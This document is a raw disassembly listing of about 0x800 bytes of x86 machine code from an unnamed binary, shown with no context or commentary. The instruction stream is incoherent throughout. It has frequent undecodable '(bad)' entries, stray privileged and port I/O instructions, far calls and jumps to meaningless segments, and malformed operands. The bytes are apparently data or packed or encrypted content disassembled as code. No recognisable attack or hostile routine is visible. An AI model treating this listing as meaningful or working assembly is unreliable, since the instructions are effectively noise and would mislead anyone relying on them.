  415b66:	xchg   ebx,eax
  415b67:	xchg   edi,eax
  415b68:	dec    esi
  415b69:	sahf   
  415b6a:	sub    DWORD PTR [esi],0x310a37a
  415b70:	ret    0xa7f5
  415b73:	cmp    cl,al
  415b75:	nop
  415b76:	imul   ebp,ebx,0xa4cabd16
  415b7c:	test   BYTE PTR [ebx+edi*8],bl
  415b7f:	stc    
  415b80:	adc    al,0x5b
  415b82:	push   ebx
  415b83:	mov    bl,0xb
  415b85:	pop    eax
  415b86:	imul   ecx,DWORD PTR [esi+0x12],0xbeeeb7ce
  415b8d:	fist   WORD PTR [eax+0x39d175d1]
  415b93:	mov    al,0x68
  415b95:	or     al,0x12
  415b97:	stc    
  415b98:	dec    edx
  415b99:	cmc    
  415b9a:	cmp    cl,dl
  415b9c:	mov    ebp,0x2a0ee1af
  415ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ba2:	and    eax,0xe9d66a2b
  415ba7:	pop    esp
  415ba8:	jne    0x415b53
  415baa:	or     al,0xbe
  415bac:	mov    ah,0x9e
  415bae:	ret    0xaac3
  415bb1:	les    esp,FWORD PTR [ecx+0x4f956398]
  415bb7:	push   es
  415bb8:	adc    cl,BYTE PTR [edi+0x44f95177]
  415bbe:	xchg   ebx,eax
  415bbf:	call   0xf851:0x8c4e591f
  415bc6:	loop   0x415bc2
  415bc8:	cli    
  415bc9:	push   ss
  415bca:	add    BYTE PTR [eax-0x57],0xf
  415bce:	aaa    
  415bcf:	stos   BYTE PTR es:[edi],al
  415bd0:	adc    edx,esp
  415bd2:	jnp    0x415bf7
  415bd4:	(bad)  
  415bd6:	call   0xd5bc7715
  415bdb:	sbb    eax,0x33369c86
  415be0:	lock scas al,BYTE PTR es:[edi]
  415be2:	dec    edi
  415be3:	mov    ebx,0x85ddfe49
  415be8:	push   cs
  415be9:	loopne 0x415c59
  415beb:	mov    eax,ds:0xa67acde9
  415bf0:	ins    BYTE PTR es:[edi],dx
  415bf1:	pop    ss
  415bf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf3:	mov    ds:0xcdff1ad9,eax
  415bf8:	adc    eax,0xdd1d69e1
  415bfd:	in     eax,0xfd
  415bff:	retf   0x3ada
  415c02:	imul   eax,DWORD PTR [ebx],0xf7bb579a
  415c08:	sbb    DWORD PTR [ebp+0x664502df],ebp
  415c0e:	mov    ebx,0x273a7648
  415c13:	sub    DWORD PTR [edx-0x53],0xa9cd1f9d
  415c1a:	int    0xf
  415c1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c1d:	xlat   BYTE PTR ds:[ebx]
  415c1e:	inc    esp
  415c1f:	test   DWORD PTR [ebx+0x622f74fb],0xb8a9c79c
  415c29:	stos   DWORD PTR es:[edi],eax
  415c2a:	dec    ecx
  415c2b:	cdq    
  415c2c:	(bad)  
  415c2d:	daa    
  415c2e:	fnstcw WORD PTR [edi-0x5d]
  415c31:	cs out dx,eax
  415c33:	lock or al,0x3a
  415c36:	xor    edi,DWORD PTR [edi]
  415c38:	sub    DWORD PTR [edi+0x65d33602],ecx
  415c3e:	mov    esp,0x78058f70
  415c43:	jmp    0x415c26
  415c45:	push   eax
  415c46:	push   0x5f
  415c48:	iret   
  415c49:	sub    eax,0x1ed4b662
  415c4e:	xchg   ebx,eax
  415c4f:	js     0x415c9f
  415c51:	hlt    
  415c52:	and    ecx,ebx
  415c54:	test   eax,0x574e18f0
  415c59:	xchg   esi,eax
  415c5a:	jl     0x415bf8
  415c5c:	mov    DWORD PTR [edx+0x5247ac57],ebx
  415c62:	fwait
  415c63:	push   esi
  415c64:	or     dh,cl
  415c66:	inc    edx
  415c67:	fs push esp
  415c69:	or     dh,dh
  415c6b:	shl    BYTE PTR [esi+0x3e],cl
  415c6e:	cmp    DWORD PTR [edx-0x1a5deeef],ebx
  415c74:	iret   
  415c75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c76:	aam    0x6d
  415c78:	fisub  DWORD PTR [edi+0x72]
  415c7b:	jne    0x415c8f
  415c7d:	sti    
  415c7e:	mov    cl,0x53
  415c80:	sbb    BYTE PTR [edi-0x389dc875],cl
  415c86:	mov    al,ds:0xc7fea689
  415c8b:	add    bl,BYTE PTR [ecx]
  415c8d:	mov    esi,0xaa59cbb0
  415c92:	loop   0x415c18
  415c94:	lds    esi,FWORD PTR [ebp+0x53]
  415c97:	out    0xdf,al
  415c99:	in     al,0xb2
  415c9b:	imul   edi,DWORD PTR [edx-0x19],0x8c021b9a
  415ca2:	and    ch,BYTE PTR [ebp-0x2c]
  415ca5:	in     al,dx
  415ca6:	push   eax
  415ca7:	aad    0x74
  415ca9:	and    DWORD PTR [bp+di],edi
  415cac:	xchg   ecx,eax
  415cad:	bound  ebx,QWORD PTR [ecx]
  415caf:	test   al,0x4d
  415cb1:	adc    ah,BYTE PTR [edi+ecx*8]
  415cb4:	cs push eax
  415cb6:	dec    esp
  415cb7:	xchg   ebp,eax
  415cb8:	dec    ebp
  415cb9:	and    ch,BYTE PTR [edx]
  415cbb:	sbb    edx,ecx
  415cbd:	popf   
  415cbe:	popa   
  415cbf:	and    dl,dl
  415cc1:	sub    DWORD PTR [ecx+0x6],edx
  415cc4:	ss sub dl,ch
  415cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415cc8:	and    esp,DWORD PTR [ebp-0x2b]
  415ccb:	sbb    edx,edx
  415ccd:	sub    DWORD PTR [esi-0x14],0x64
  415cd1:	mov    ds:0xb29ff933,eax
  415cd6:	cmp    bl,BYTE PTR [ebp+ecx*8-0x1e]
  415cda:	(bad)  
  415cdb:	stc    
  415cdc:	sahf   
  415cdd:	sub    BYTE PTR [edx+0x7681a7d2],al
  415ce3:	dec    ebx
  415ce4:	ja     0x415d0b
  415ce6:	pop    eax
  415ce7:	sahf   
  415ce8:	ss jmp 0x415d2a
  415ceb:	mov    BYTE PTR [eax-0x516f8e3c],cl
  415cf1:	mov    dh,0xbb
  415cf3:	cmp    al,0xb6
  415cf5:	mov    al,0xb3
  415cf7:	inc    al
  415cf9:	addr16 leave 
  415cfb:	outs   dx,BYTE PTR ds:[esi]
  415cfc:	aaa    
  415cfd:	mov    eax,ds:0x6654ce5b
  415d02:	ret    0xd0d1
  415d05:	push   ebp
  415d06:	mov    WORD PTR [ebx-0x45],?
  415d09:	and    bx,WORD PTR [ebx*1-0x2c5259a0]
  415d11:	push   cs
  415d12:	call   0x4271:0x18945a46
  415d19:	mov    dh,0x99
  415d1b:	(bad)  
  415d1c:	jge    0x415d90
  415d1e:	adc    cl,BYTE PTR [edx-0x25440f6c]
  415d24:	or     BYTE PTR [esi+0x3421924b],0x71
  415d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d2c:	xlat   BYTE PTR ds:[ebx]
  415d2d:	mov    DWORD PTR [eax+0x75],ecx
  415d30:	es push 0x68cb98b3
  415d36:	adc    esp,edi
  415d38:	or     al,0xaa
  415d3a:	retf   
  415d3b:	mov    eax,ds:0xc29dcc40
  415d40:	xchg   ebx,eax
  415d41:	push   edx
  415d42:	pusha  
  415d43:	les    ebp,FWORD PTR [eax]
  415d45:	sbb    al,0x1b
  415d47:	stos   DWORD PTR es:[edi],eax
  415d48:	fld    QWORD PTR [ebx-0x1b]
  415d4b:	mov    ebp,0xd94db370
  415d50:	rcr    esp,cl
  415d52:	cs or  al,0x86
  415d55:	sub    bl,BYTE PTR [esi-0x65]
  415d58:	push   eax
  415d59:	mov    ebx,0xf60e05ba
  415d5e:	push   ds
  415d5f:	dec    edx
  415d60:	adc    cl,BYTE PTR [edx-0x5e65346d]
  415d66:	add    edx,esp
  415d68:	and    al,0xce
  415d6a:	cmp    eax,0x716e632e
  415d6f:	mov    ebp,0x1269899a
  415d74:	add    eax,0x18263cfe
  415d79:	loop   0x415d5c
  415d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d7c:	(bad)  
  415d7d:	mov    BYTE PTR [ebx+0x33],ah
  415d80:	add    ch,BYTE PTR [ecx-0x11]
  415d83:	daa    
  415d84:	fidiv  WORD PTR [esi+edi*4]
  415d87:	jno    0x415d1e
  415d89:	xchg   BYTE PTR [esi+0x55],bl
  415d8c:	pop    ebp
  415d8d:	sbb    cl,cl
  415d8f:	loopne 0x415d83
  415d91:	scas   eax,DWORD PTR es:[edi]
  415d92:	xchg   esi,eax
  415d93:	or     al,0xf1
  415d95:	int    0xef
  415d97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d98:	mov    al,ds:0x82e9895a
  415d9d:	idiv   edi
  415d9f:	adc    eax,0x550b3f2e
  415da4:	mov    eax,ds:0x2b2980c
  415da9:	jae    0x415d6c
  415dab:	loopne 0x415d4d
  415dad:	sub    al,0x27
  415daf:	pop    eax
  415db0:	stos   BYTE PTR es:[edi],al
  415db1:	cmp    DWORD PTR [edi],edx
  415db3:	ds call 0x5afa:0x7a053dcf
  415dbb:	outs   dx,BYTE PTR ds:[esi]
  415dbc:	xchg   ebx,eax
  415dbd:	popf   
  415dbe:	mov    BYTE PTR [esi],bl
  415dc0:	daa    
  415dc1:	test   DWORD PTR [eax+ecx*1],esi
  415dc4:	push   edi
  415dc5:	mov    al,BYTE PTR [ebx]
  415dc7:	in     eax,0xc1
  415dc9:	mov    edx,0x204782ca
  415dce:	cmp    bh,BYTE PTR [edi]
  415dd0:	add    al,0x17
  415dd2:	mov    bl,0x57
  415dd4:	aad    0xde
  415dd6:	pop    esi
  415dd7:	(bad)  
  415dd8:	or     eax,0x2e394d7b
  415ddd:	mov    eax,ds:0x4a464df3
  415de2:	sahf   
  415de3:	ret    0x1702
  415de6:	in     eax,0x68
  415de8:	pop    ebp
  415de9:	clc    
  415dea:	and    eax,0x637e4774
  415def:	push   esi
  415df0:	sti    
  415df1:	dec    ebx
  415df2:	in     eax,0x63
  415df4:	dec    edi
  415df5:	test   al,0x30
  415df7:	and    esi,DWORD PTR [ecx]
  415df9:	cwde   
  415dfa:	cli    
  415dfb:	pop    ss
  415dfc:	sahf   
  415dfd:	jo     0x415db1
  415dff:	out    dx,eax
  415e00:	jnp    0x415dc2
  415e02:	inc    esp
  415e03:	hlt    
  415e04:	icebp  
  415e05:	(bad)  
  415e07:	mov    edi,0xb8f76a29
  415e0c:	or     dl,ah
  415e0e:	adc    al,0x4b
  415e10:	xchg   edi,eax
  415e11:	mov    edi,0x6be989d9
  415e16:	jecxz  0x415e07
  415e18:	arpl   WORD PTR [ecx+0x46],bp
  415e1b:	adc    ebp,esp
  415e1d:	mov    ebp,0xd419ba
  415e22:	call   0xfcf8:0x8ff6d857
  415e29:	cmp    ebp,DWORD PTR [ecx-0xc]
  415e2c:	enter  0xd3fb,0x7a
  415e30:	xor    bl,0x40
  415e33:	sbb    esp,0x2a
  415e36:	sub    al,0xd2
  415e38:	loop   0x415e20
  415e3a:	popf   
  415e3b:	mov    DWORD PTR [edx+0x4673f2c1],esp
  415e41:	and    DWORD PTR [ebx-0x6456d07c],eax
  415e47:	push   esi
  415e48:	lods   al,BYTE PTR ds:[esi]
  415e49:	mov    edx,0x4384eaa3
  415e4e:	lahf   
  415e4f:	jl     0x415df1
  415e51:	(bad)  
  415e53:	xchg   edx,eax
  415e54:	ja     0x415e24
  415e56:	or     al,0xcc
  415e58:	adc    eax,0x59f81abf
  415e5d:	inc    ecx
  415e5e:	sub    edi,esi
  415e60:	outs   dx,BYTE PTR ds:[esi]
  415e61:	imul   edx,edx,0x591a331b
  415e67:	shr    BYTE PTR [eax],cl
  415e69:	out    0x4c,eax
  415e6b:	or     esi,ecx
  415e6d:	je     0x415eab
  415e6f:	xchg   ebp,eax
  415e70:	outs   dx,BYTE PTR ds:[esi]
  415e71:	loop   0x415e83
  415e73:	jp     0x415e9c
  415e75:	push   esi
  415e76:	or     bh,al
  415e78:	imul   esp
  415e7a:	adc    bl,BYTE PTR [edi]
  415e7c:	or     ebp,DWORD PTR [edi+0x40]
  415e7f:	sub    ah,BYTE PTR [ebx]
  415e81:	bound  edx,QWORD PTR [ecx]
  415e83:	ret    
  415e84:	cwde   
  415e85:	outs   dx,DWORD PTR ds:[esi]
  415e86:	mov    ebp,0xeb7be5cf
  415e8b:	out    0xc,al
  415e8d:	test   BYTE PTR [bp+si+0xb8c],0x9e
  415e93:	xchg   DWORD PTR [esi+0x5f8d9fd0],edx
  415e99:	jl     0x415e84
  415e9b:	cli    
  415e9c:	jnp    0x415eaa
  415e9e:	(bad)  
  415ea0:	adc    ebp,DWORD PTR [edi+0x680f4d1]
  415ea6:	mov    al,ds:0xaef70745
  415eab:	push   esi
  415eac:	fild   QWORD PTR [ecx-0x6586b012]
  415eb2:	xchg   ecx,edx
  415eb4:	push   cs
  415eb5:	ja     0x415e6e
  415eb7:	add    ah,BYTE PTR [edx-0x5bc1c172]
  415ebd:	leave  
  415ebe:	call   0x2483528d
  415ec3:	nop
  415ec4:	mov    edi,0xfc4b1ef4
  415ec9:	dec    eax
  415eca:	stos   DWORD PTR es:[edi],eax
  415ecb:	dec    eax
  415ecc:	mov    eax,ds:0x32b4b540
  415ed1:	xor    dl,BYTE PTR [eax]
  415ed3:	jl     0x415ea7
  415ed5:	push   esi
  415ed6:	ret    
  415ed7:	shr    DWORD PTR [eax],1
  415ed9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eda:	test   eax,0x57f5ad98
  415edf:	cmp    BYTE PTR [esi+0x4866e65a],dl
  415ee5:	lods   eax,DWORD PTR ds:[esi]
  415ee6:	cmp    al,0xe9
  415ee8:	imul   edi,DWORD PTR ds:0xede68663,0x9d3c900b
  415ef2:	jecxz  0x415e98
  415ef4:	jmp    0x415f4e
  415ef6:	jle    0x415f31
  415ef8:	jbe    0x415f66
  415efa:	adc    edx,DWORD PTR [esi]
  415efc:	xor    eax,0x9376b2e3
  415f01:	lea    ebp,[edx]
  415f03:	xchg   esi,eax
  415f04:	jbe    0x415ea8
  415f06:	imul   edx,esi,0x3cfca34b
  415f0c:	dec    edx
  415f0d:	shl    DWORD PTR [ebp-0x44],1
  415f10:	dec    esp
  415f11:	dec    ebp
  415f12:	int3   
  415f13:	pop    ds
  415f14:	inc    eax
  415f15:	mov    al,0x46
  415f17:	dec    esp
  415f18:	mov    esi,0xf9226bf9
  415f1d:	sub    eax,0x8b499a3d
  415f22:	clc    
  415f23:	jb     0x415eb9
  415f25:	and    BYTE PTR [ecx+0x1ef1a13c],ah
  415f2b:	inc    esp
  415f2c:	emms   
  415f2e:	cmp    dl,BYTE PTR [ebx+0x5b]
  415f31:	ret    0x9978
  415f34:	sbb    esp,ebp
  415f36:	pushf  
  415f37:	test   BYTE PTR [edi-0x3ecb7426],ch
  415f3d:	pop    ebp
  415f3e:	mov    edx,0x1fdc8fb4
  415f43:	push   ebx
  415f44:	test   ah,al
  415f46:	push   cs
  415f47:	lods   eax,DWORD PTR ds:[esi]
  415f48:	xor    bl,BYTE PTR [ebp+0x2e69cbe3]
  415f4e:	dec    ebx
  415f4f:	rcr    BYTE PTR [edi+ebp*1+0x5c],1
  415f53:	or     ebx,DWORD PTR [edx]
  415f55:	clc    
  415f56:	jecxz  0x415fac
  415f58:	jmp    0x415f85
  415f5a:	mov    edx,0x6a9b1505
  415f5f:	pop    esi
  415f60:	adc    eax,0x988918b8
  415f65:	jnp    0x415eed
  415f67:	js     0x415f77
  415f69:	sub    eax,0xe9c582cd
  415f6e:	ficom  WORD PTR [edx-0x37d8893]
  415f74:	mov    al,ds:0xe1414067
  415f79:	dec    ebp
  415f7a:	cwde   
  415f7b:	fadd   st,st(6)
  415f7d:	imul   ecx,DWORD PTR [edx-0x53],0x7c8e8b1f
  415f84:	push   0xffffffda
  415f86:	mov    dl,0x8a
  415f88:	and    ch,BYTE PTR [ecx]
  415f8a:	mov    ecx,0x84ba8761
  415f8f:	add    BYTE PTR [edi],al
  415f91:	fdiv   QWORD PTR [bp-0x20e1]
  415f96:	mov    ebx,0x18d551cd
  415f9b:	(bad)  
  415f9c:	fld    TBYTE PTR [edi+edi*4+0x49]
  415fa0:	mov    ch,0xcc
  415fa2:	hlt    
  415fa3:	imul   ecx,DWORD PTR [edi],0xe596530b
  415fa9:	cld    
  415faa:	sub    ebx,DWORD PTR [edi]
  415fac:	inc    esi
  415fad:	inc    ecx
  415fae:	mov    ds:0x35f2a729,eax
  415fb3:	fwait
  415fb4:	dec    ecx
  415fb5:	xchg   esp,eax
  415fb6:	loopne 0x415f46
  415fb8:	xchg   esi,eax
  415fb9:	cmp    al,0x34
  415fbb:	std    
  415fbc:	push   edx
  415fbd:	sbb    edx,esp
  415fbf:	fwait
  415fc0:	mov    ebp,0x713c8c29
  415fc5:	or     bl,BYTE PTR [ebp+0x339cf9a4]
  415fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fcc:	arpl   WORD PTR ds:0xe60d5e75,di
  415fd2:	or     ecx,edi
  415fd4:	out    0x29,eax
  415fd6:	gs cs pushf 
  415fd9:	or     ch,BYTE PTR [edi]
  415fdb:	sub    al,0xd3
  415fdd:	(bad)  
  415fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fdf:	cwde   
  415fe0:	sub    cl,cl
  415fe2:	shr    DWORD PTR [ecx-0x3faaa796],0x31
  415fe9:	adc    DWORD PTR [edx+0x72],esp
  415fec:	ret    
  415fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fee:	inc    eax
  415fef:	test   BYTE PTR ds:0xeed2ede2,ah
  415ff5:	add    eax,0xc59ee71
  415ffa:	and    bh,ah
  415ffc:	out    0x81,al
  415ffe:	popf   
  415fff:	stos   BYTE PTR es:[edi],al
  416000:	aad    0x64
  416002:	and    eax,0xa60242f4
  416007:	jmp    0xb47f:0x209980c5
  41600e:	or     DWORD PTR [ebp-0x7f7e6b39],0x47
  416015:	adc    BYTE PTR [esp+ecx*1-0x35],bl
  416019:	adc    eax,0xf79513f1
  41601e:	push   ebp
  41601f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416020:	jecxz  0x416023
  416022:	ss push es
  416024:	pop    ss
  416025:	xor    bl,dh
  416027:	sub    DWORD PTR [edx+0x5a],0xabd6bc9
  41602e:	outs   dx,BYTE PTR ds:[esi]
  41602f:	mov    ecx,ecx
  416031:	lahf   
  416032:	ror    BYTE PTR [ebx],1
  416034:	jecxz  0x416078
  416036:	out    dx,eax
  416037:	jl     0x4160aa
  416039:	fist   DWORD PTR [edx+0x2bdc594]
  41603f:	cmp    ebp,DWORD PTR [edi]
  416041:	pop    ebx
  416042:	and    eax,0xd30b4b8d
  416047:	mov    edi,0x8df03480
  41604c:	(bad)  
  41604d:	mov    esi,0x7351b2af
  416052:	ror    BYTE PTR [ebx-0x68772361],1
  416058:	jns    0x416029
  41605a:	sub    al,0x50
  41605c:	retf   0x91be
  41605f:	dec    eax
  416060:	xor    al,0xd8
  416062:	scas   eax,DWORD PTR es:[edi]
  416063:	jl     0x416094
  416065:	clc    
  416066:	fstp   TBYTE PTR [edi+0x7a]
  416069:	(bad)  
  41606a:	xor    al,0xfe
  41606c:	stos   BYTE PTR es:[edi],al
  41606d:	sbb    dh,BYTE PTR [esi-0x45]
  416070:	inc    ebx
  416071:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416072:	scas   al,BYTE PTR es:[edi]
  416073:	push   edi
  416074:	arpl   WORD PTR [ecx],bx
  416076:	mov    BYTE PTR [edi],ch
  416078:	cmp    eax,0x951c678b
  41607d:	(bad)  
  41607f:	ficomp WORD PTR [ebx-0x492d7c79]
  416085:	pop    eax
  416086:	mov    ebp,0x609ab595
  41608b:	mov    ?,ecx
  41608d:	and    ebx,DWORD PTR [edi-0x7]
  416090:	pop    edi
  416091:	cld    
  416092:	test   DWORD PTR [ebx+0x43],0xd48f3997
  416099:	leave  
  41609a:	or     ebp,DWORD PTR [eax]
  41609c:	adc    bl,dl
  41609e:	push   ss
  41609f:	or     DWORD PTR [ebx+0x8a446cb],edx
  4160a5:	imul   edi,DWORD PTR [edx-0xd],0xcf05c5c4
  4160ac:	inc    edi
  4160ad:	mov    cl,0x18
  4160af:	addr16 out dx,al
  4160b1:	pop    es
  4160b2:	ror    BYTE PTR [ebp-0x478a05bf],0xe8
  4160b9:	add    al,0xd6
  4160bb:	push   edx
  4160bc:	mov    ch,0x3d
  4160be:	loope  0x416079
  4160c0:	mov    al,0x29
  4160c2:	push   sp
  4160c4:	les    ebp,FWORD PTR [edi+0x61]
  4160c7:	jbe    0x41613e
  4160c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160ca:	daa    
  4160cb:	xchg   esi,eax
  4160cc:	std    
  4160cd:	ja     0x41613e
  4160cf:	jl     0x4160f1
  4160d1:	mov    DWORD PTR [eax-0x3b5c6007],eax
  4160d7:	xchg   DWORD PTR [ebp+0x3008a6f2],ecx
  4160dd:	jno    0x41611c
  4160df:	jns    0x41614d
  4160e1:	(bad)  
  4160e2:	(bad)  
  4160e3:	imul   edi,DWORD PTR ds:0x4774c880,0x2e
  4160ea:	test   eax,0xc2df100e
  4160ef:	dec    esp
  4160f0:	xor    ah,dl
  4160f2:	das    
  4160f3:	jmp    0xaeae:0x7e14fec0
  4160fa:	or     dl,BYTE PTR [ebx]
  4160fc:	adc    cl,BYTE PTR [eax]
  4160fe:	sbb    al,0x12
  416100:	mov    DWORD PTR [eax+0x288185a9],eax
  416106:	inc    edi
  416107:	add    BYTE PTR [ebp+0x25],bl
  41610a:	lods   al,BYTE PTR ds:[esi]
  41610b:	sub    BYTE PTR [ecx-0x67],ah
  41610e:	add    ebp,DWORD PTR [edi+eiz*1+0x31]
  416112:	int3   
  416113:	adc    cl,BYTE PTR [esp+ebx*2-0x52]
  416117:	pop    ds
  416118:	cmc    
  416119:	or     eax,0x6596d8ba
  41611e:	mov    ?,WORD PTR [edx]
  416120:	xchg   DWORD PTR [ecx+0x49],esp
  416123:	push   0xacc20fbe
  416128:	inc    ebx
  416129:	cmovno edx,DWORD PTR [edx+0x3a]
  41612d:	arpl   WORD PTR [ecx+0x327760],dx
  416133:	fcom   DWORD PTR [ebp-0x79]
  416136:	fstp   st(4)
  416138:	dec    BYTE PTR ds:[eax-0x535fb4ff]
  41613f:	aas    
  416140:	push   es
  416141:	ss adc ah,dh
  416144:	push   ds
  416145:	or     eax,0xc6680a73
  41614a:	pop    esp
  41614b:	das    
  41614c:	ficomp DWORD PTR [edx+eax*1+0x1a]
  416150:	pop    ds
  416151:	leave  
  416152:	push   esp
  416153:	cli    
  416154:	push   ebp
  416155:	es sbb ch,0x0
  416159:	sbb    ah,BYTE PTR [ecx]
  41615b:	dec    ebx
  41615c:	aam    0x11
  41615e:	cdq    
  41615f:	outs   dx,BYTE PTR ds:[esi]
  416160:	jmp    0xc1d22bb9
  416165:	out    dx,al
  416166:	iret   
  416167:	jp     0x41618b
  416169:	xor    eax,0x6d36e9b6
  41616e:	jo     0x41612b
  416170:	stc    
  416171:	push   edi
  416172:	enter  0x12cd,0xaa
  416176:	hlt    
  416177:	xchg   ebx,eax
  416178:	in     al,0x36
  41617a:	sti    
  41617b:	std    
  41617c:	je     0x4161f7
  41617e:	hlt    
  41617f:	scas   eax,DWORD PTR es:[edi]
  416180:	mov    esi,edi
  416182:	and    BYTE PTR [edi+0x0],al
  416185:	hlt    
  416186:	popf   
  416187:	outs   dx,BYTE PTR ds:[esi]
  416188:	add    BYTE PTR [esi-0x2b],ch
  41618b:	sub    esi,DWORD PTR [eax+0x47]
  41618e:	leave  
  41618f:	cld    
  416190:	ins    DWORD PTR es:[edi],dx
  416191:	dec    ebx
  416192:	cmp    DWORD PTR [edx+0x62],ebp
  416195:	push   esi
  416196:	cmp    edi,DWORD PTR [eax+ebp*1-0x3c]
  41619a:	rol    dl,1
  41619c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41619d:	loope  0x416192
  41619f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161a0:	adc    esp,eax
  4161a2:	jno    0x41617f
  4161a4:	bound  edi,QWORD PTR [edx]
  4161a6:	mov    BYTE PTR [edi-0x706245b4],bl
  4161ac:	dec    esi
  4161ad:	mov    esi,0xc4cbfc0f
  4161b2:	jnp    0x416232
  4161b4:	jmp    0x4161d3
  4161b6:	sub    ecx,DWORD PTR ds:0x29e7efe4
  4161bc:	mov    esi,0x7a190d24
  4161c1:	jp     0x4161e2
  4161c3:	fmul   DWORD PTR [edi]
  4161c5:	push   edx
  4161c6:	mov    ecx,0x5e2cd29
  4161cb:	inc    ebx
  4161cc:	sbb    DWORD PTR [ecx+0x77],ecx
  4161cf:	jno    0x41617e
  4161d1:	dec    ebp
  4161d2:	mov    bh,0x2d
  4161d4:	jae    0x4161ec
  4161d6:	mov    ds:0xb6fd277,al
  4161db:	repnz rol BYTE PTR [edi-0x54b56d4f],1
  4161e2:	es mov ebx,0xaa598146
  4161e8:	leave  
  4161e9:	cld    
  4161ea:	ret    0x45f3
  4161ed:	mov    dh,0x3
  4161ef:	fsub   st,st(7)
  4161f1:	out    dx,al
  4161f2:	data16 lods al,BYTE PTR ds:[esi]
  4161f4:	xor    dl,BYTE PTR [ecx+0x6c]
  4161f7:	mov    edx,0xcb9449d8
  4161fc:	fnsave [eax]
  4161fe:	jle    0x416229
  416200:	pop    ebx
  416201:	dec    edi
  416202:	not    ebx
  416204:	jns    0x41620d
  416206:	push   ecx
  416207:	inc    edx
  416208:	popf   
  416209:	mov    ds:0xf3f006fc,al
  41620e:	sbb    ecx,DWORD PTR [esi-0x6894e797]
  416214:	(bad)  
  416216:	lods   eax,DWORD PTR ds:[esi]
  416217:	nop
  416218:	jg     0x4161e9
  41621a:	in     al,0x75
  41621c:	shl    BYTE PTR [edi-0x76d428b4],1
  416222:	sbb    al,0xa6
  416224:	nop
  416225:	dec    esi
  416226:	push   ss
  416227:	sbb    eax,0xa6d03948
  41622c:	js     0x416219
  41622e:	neg    BYTE PTR [esi+0x74]
  416231:	je     0x416230
  416233:	mov    WORD PTR [eax+0x6c],fs
  416236:	dec    sp
  416238:	dec    ebp
  416239:	jb     0x4161c3
  41623b:	call   0x83071cbf
  416240:	test   eax,0xbc696294
  416245:	ins    DWORD PTR es:[edi],dx
  416246:	repz xor al,0x10
  416249:	adc    dl,ah
  41624b:	out    dx,eax
  41624c:	inc    eax
  41624d:	jnp    0x4161d2
  41624f:	mov    BYTE PTR [eax-0x7ae5e422],dl
  416255:	mov    ah,0xd3
  416257:	or     al,0xfe
  416259:	inc    esi
  41625a:	and    bh,BYTE PTR [edx+eiz*1-0xc]
  41625e:	pop    edx
  41625f:	cmp    DWORD PTR [eax-0x294c0a1a],0x27
  416266:	imul   ebp,DWORD PTR [ebx+ecx*4+0x6158fa1f],0x3ca1abcf
  416271:	pop    ss
  416272:	dec    esp
  416273:	es push es
  416275:	or     edx,DWORD PTR [edx]
  416277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416278:	pushf  
  416279:	cmp    esp,0x53
  41627c:	ins    BYTE PTR es:[edi],dx
  41627d:	les    edi,FWORD PTR [ecx+0x7ae22883]
  416283:	jne    0x416242
  416285:	ins    BYTE PTR es:[edi],dx
  416286:	ins    DWORD PTR es:[edi],dx
  416287:	cli    
  416288:	in     al,dx
  416289:	mov    ds:0x2925785c,al
  41628e:	pop    esp
  41628f:	jno    0x4162a8
  416291:	sbb    esp,ecx
  416293:	push   ecx
  416294:	dec    ecx
  416295:	bound  esi,QWORD PTR [esi-0x462c035b]
  41629b:	aad    0x3e
  41629d:	or     BYTE PTR [ebp+0x56],ch
  4162a0:	dec    esi
  4162a1:	add    eax,DWORD PTR es:[edi+edx*4+0x3c]
  4162a6:	sub    al,0xe5
  4162a8:	jb     0x4162f4
  4162aa:	icebp  
  4162ab:	ds push edx
  4162ad:	mul    DWORD PTR [ecx]
  4162af:	xchg   ebp,eax
  4162b0:	inc    ebx
  4162b1:	arpl   di,dx
  4162b3:	xchg   edx,eax
  4162b4:	ja     0x41628b
  4162b6:	or     al,BYTE PTR [eax+0x20]
  4162b9:	in     al,0x90
  4162bb:	push   ecx
  4162bc:	bound  dx,DWORD PTR [ecx+0x1e]
  4162c0:	popa   
  4162c1:	int    0xe4
  4162c3:	cmp    bh,BYTE PTR [esi-0x47]
  4162c6:	mov    eax,ds:0xcbf54781
  4162cb:	add    eax,0x88669417
  4162d0:	jb     0x4162b4
  4162d2:	jo     0x4162d2
  4162d4:	test   al,0x5
  4162d6:	sbb    ah,BYTE PTR [ecx+0x69893be3]
  4162dc:	fwait
  4162dd:	mov    dh,BYTE PTR [edi+eiz*8-0x59c15204]
  4162e4:	jmp    0x4162a0
  4162e6:	ret    
  4162e7:	fwait
  4162e8:	loopne 0x416305
  4162ea:	push   ebx
  4162eb:	and    BYTE PTR [esi+0x52],dh
  4162ee:	popf   
  4162ef:	xchg   esi,eax
  4162f0:	(bad)  
  4162f1:	jg     0x41627a
  4162f3:	push   0xc
  4162f5:	stos   BYTE PTR es:[edi],al
  4162f6:	sub    bl,BYTE PTR [ebx+ebx*2-0x26a5cb9c]
  4162fd:	ret    
  4162fe:	cmp    DWORD PTR [edi],ecx
  416300:	xor    dl,dl
  416302:	pusha  
  416303:	xor    bh,BYTE PTR [edx]
  416305:	jmp    0x416376
  416307:	pop    ds
  416308:	aad    0x8e
  41630a:	adc    BYTE PTR [eax+ecx*2-0x31a19786],0x89
  416312:	nop
  416313:	jmp    0x48960450
  416318:	dec    ecx
  416319:	push   ss
  41631a:	sub    BYTE PTR [ebx+0x421311eb],0xeb
  416321:	mov    cl,BYTE PTR [ecx-0x3b6f0e91]
